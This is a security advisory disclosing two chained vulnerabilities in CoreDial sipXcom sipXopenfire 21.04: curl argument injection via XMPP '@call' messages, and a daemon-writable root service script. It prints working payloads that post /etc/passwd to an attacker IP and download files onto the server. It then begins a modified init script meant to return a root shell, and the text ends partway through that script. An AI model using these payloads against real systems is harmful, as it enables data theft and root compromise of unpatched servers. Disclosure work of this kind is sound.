{
    "text": "title : CoreDial sipXcom sipXopenfire 21.04 Remote Command Execution / Weak Permissions  ， detail : CoreDial sipXcom sipXopenfire versions 21.04 and below suffer from XMPP message system command argument injection and insecure service file permissions that when chained together gives root.  ， cve : advisories | CVE-2023-25355 , CVE-2023-25356  ，  ， desc : _  ， \\_/ _ ( '-' )  (  (  ) \\_/  ，   ， Product : sipXcom sipXopenfire  ， Vendor : CoreDial  ， Name : \"sipXcom sipXopenfire XMPP message system command  ， argument injection and insecure service file  ， permissions RCE\"  ， Version : 21.04 and earlier  ， Fixed : Nope , no response  ， Link : http : /download.sipxcom.org/  ， CVEs : CVE-2023-25355 & CVE-2023-25356  ， _  ， \\_/ _ ( '-' )  (  (  ) \\_/  ，   ， TL ; DR  ，   ， CoreDial's sipXcom is a PBX server. It bundles an XMPP server  ， component sipXopenfire , which is disabled by default. sipXopenfire  ， is affected by an OS command argument injection vulnerability  ，  ( CVE-2023-25356 )  , which allows any user with an XMPP account to pass  ， arbitrary arguments to a curl command. The same component is also  ， affected by a weak file permissions vulnerability ( CVE-2023-25355 )  ,   ， affecting a service startup script which runs as root. Both issues  ， can be chained to execute commands as the system root user.  ， At the time of this disclosure , we have had no response from  ， CoreDial , and neither issue has been fixed.  ， _  ，   ， CVE-2023-25356 : OS Command Argument Injection  ，   ， As part of the initializePlugin (  ) routine in  ， sipXopenfire\\presence-plugin\\src\\org\\sipfoundry\\openfire\\plugin\\presence\\SipXOpenfirePlugin.java ,   ， an \"interceptor\" called DefaultMessagePacketInterceptor is  ， registered.  ， The DefaultMessagePacketInterceptor inspects every message that's  ， sent through the XMPP server. If a message starts with any of the  ， strings \" @ call\" , \" @ conf\" or \" @ xfer\" ( referred to internally as  ， \"directives\" )  , a related code path is taken , where the message  ， content is processed according to what the specific directive is  ， meant to achieve.  ， When a message is intercepted which starts with \" @ call\" , all the  ， text after this string is assumed to be a phone number and passed to  ， the buildRestCallCommand (  ) function. This function creates a long  ， URL , which the user input is written directly into. There's no  ， particular attempt to sanitise this input.  ， This URL is then passed to the sendRestRequest (  ) function , where it  ， is appended to a curl command string. This string is then passed to  ， Runtime.getRuntime (  ) .exec ( command ) .  ， Due to the inner mechanics of Runtime's exec (  ) function , we are only  ， able to control arguments passed to the main curl command.  ， The constructed curl command is as follows :   ， `  ， curl -k -X POST http : / [ IPAddress ]  :  [ Port ] /callcontroller/ [ callerNumber ] / [ controlledString ] timeout=30&isForwardingAllowed=true  ， `  ， Since we can inject arbitrary arguments , we can construct a set of  ， arguments which will read a file using the -d/-data flag , and send  ， it over the network to us. The only limitation is that the  ， sipXopenfire process runs as the daemon user. So we can only read  ， files that are accessible to daemon. However , this includes  ， potentially interesting files , like the chat history  ，  ( /opt/openfire/logs/sipxopenfire-im.log ) when chat logging is  ， enabled.  ， As proof-of-concept , the following payload will read /etc/passwd  ， and post it to http : /192.168.96.128/abc.  ， `  ，  @ call abc -o/tmp/test123 -d @ /etc/passwd http : /192.168.96.128/abc  ， `  ， We can also download files and write them to the server filesystem.  ， The following will download the file from  ， http : /192.168.96.128/test.txt and write it to /tmp/test.txt  ， `  ，  @ call abc -o /tmp/dummy -o /tmp/test.txt -X GET http : /192.168.96.128/test.txt -o /tmp/dummy  ， `  ， _  ，   ， CVE-2023-25355 : Weak Service File Permissions  ，   ， The /etc/init.d/openfire service file is owned by the daemon user and  ， group , but runs as the root user. This gives a relatively clear  ， path to privilege escalation.  ， It also provides a very useful exploitation path , when chained with  ， the curl argument injection issue.  ， Since we can download files and write them to the filesystem , and  ， the sipXopenfire process runs as the daemon user , we can overwrite  ， the /etc/init.d/openfire file with a modified version.  ， The following modified /etc/init.d/openfire will return a shell to  ， port 4444 on 192.168.96.128 when the sipXopenfire service is  ，  ( re ) started.  ， `  ，  #  ! /bin/sh  ，  ，  # openfire Stops and starts the Openfire XMPP service.  ，  ，  # chkconfig : 2345 99 1  ，  # description : Openfire is an XMPP server , which is a server that facilitates \\  ，  # XML based communication , such as chat.  ，  # config : /opt/openfire/conf/openfire.xml  ，  # config : /etc/sysconfig/openfire",
    "time": "Mar 7, 2023"
}